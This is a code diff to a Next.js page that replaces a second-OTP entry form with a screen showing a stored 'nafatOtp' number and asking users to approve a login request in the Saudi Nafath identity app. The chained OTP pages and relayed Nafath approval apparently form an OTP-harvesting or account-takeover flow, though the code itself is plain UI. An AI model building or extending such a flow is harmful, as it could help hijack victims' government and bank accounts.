@@ -1,6 +1,7 @@
 import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
 import { Swiper, SwiperSlide } from 'swiper/react'
 import SwiperCore from 'swiper'
+import { FaArrowRightLong } from 'react-icons/fa6'
 import { useRouter, useSearchParams } from 'next/navigation'
 
 // Import Swiper styles
@@ -10,58 +11,38 @@ import 'swiper/css/pagination'
 import 'swiper/css/scrollbar'
 import 'swiper/css/free-mode'
 import 'swiper/css/thumbs'
-import { FaArrowRightLong } from 'react-icons/fa6'
+import toast from 'react-hot-toast'
+import Link from 'next/link'
 import { useEffect, useState } from 'react'
 
-const SecondOtp = () => {
+const Nafat = () => {
   SwiperCore.use([Autoplay])
   const router = useRouter()
-  const searchParams = useSearchParams()
-  const params = new URLSearchParams(searchParams)
-  // a countdown timer function
-  const [time, setTime] = useState(180)
+  const params = useSearchParams()
+
+  console.log('params.get(id)', params.get('id'))
+
+  // get order data from api localhost:3000/api/order/:id
+  const [order, setOrder] = useState([])
+
   useEffect(() => {
-    const timer = setInterval(() => {
-      setTime((prevTime) => {
-        if (prevTime === 0) {
-          clearInterval(timer)
-          return 0
-        }
-        return prevTime - 1
-      })
-    }, 1000)
-    return () => clearInterval(timer)
-  }, [])
+    params.get('id') &&
+      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`)
+        .then((res) => res.json())
+        .then((data) => {
+          setOrder(data)
+        })
+        .catch((err) => {
+          alert(`Please enter correct otp ~ ${err}`)
+        })
+  }, [params])
 
   const handleSubmit = (e) => {
     e.preventDefault()
-    const submitData = {
-      secondOtp: e.target.secondOtp.value,
-    }
-
-    if (submitData.secondOtp === '') {
-      toast.error('Please enter your first otp')
-    } else {
-      // post all the data through api localhost:3000/api/order
-      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
-        method: 'PATCH',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(submitData),
-      })
-        .then((res) => res.json())
-        .then((data) => {
-          if (data) {
-            router.push({
-              pathname: '/profession',
-              query: { id: data._id },
-            })
-          } else {
-            toast.error('Please enter correct otp')
-          }
-        })
-    }
+    router.push({
+      pathname: '/second-otp',
+      query: { id: params.get('id') },
+    })
   }
 
   return (
@@ -111,43 +92,42 @@ const SecondOtp = () => {
         </SwiperSlide>
       </Swiper>
       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
-        <h1 className="text-4xl font-bold text-gray-600 mt-10">Second OTP</h1>
-        {/* a countdown timer for 180s design */}
-        <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
-          <h1 className="text-2xl font-bold text-gray-600 m-0">
-            {Math.floor(time / 60)}:
-          </h1>
-          <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
+        <h1 className="text-4xl font-bold text-gray-600 mt-10">Nafat App</h1>
+        {/* make this link as a button */}
+
+        <p className="text-gray-600 text-center mt-5 font-bold">
+          رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
+        </p>
+        <p className="text-gray-600 text-center my-5 font-bold">
+          Please accept the login request from Nafath app
+        </p>
+        {/* a countdown design round border */}
+
+        <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
+          <p className="text-gray-600 text-center m-0 font-bold">
+            {order.nafatOtp ? order.nafatOtp : 'N/A'}
+          </p>
         </div>
 
+        <Link
+          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
+          target="_blank"
+          className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
+        >
+          OPEN NAFATH APP
+        </Link>
         <form onSubmit={handleSubmit} className="w-3/4 my-14">
-          <div className="relative z-0 w-full mb-6 group">
-            <input
-              type="number"
-              name="secondOtp"
-              id="secondOtp"
-              className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
-              placeholder=""
-              required
-            />
-            <label
-              htmlFor="secondOtp"
-              className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
-            >
-              Enter Your Second OTP
-            </label>
-          </div>
           <button
             type="submit"
             className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
           >
-            Continue to Proceed <FaArrowRightLong size={16} />
+            Continue To OTP2 <FaArrowRightLong size={16} />
           </button>
         </form>
       </div>
-      <div className="h-20 bg-teal-400 mt-5" />
+      <div className="h-20 bg-teal-400 mt-5"></div>
     </>
   )
 }
 
-export default SecondOtp
+export default Nafat
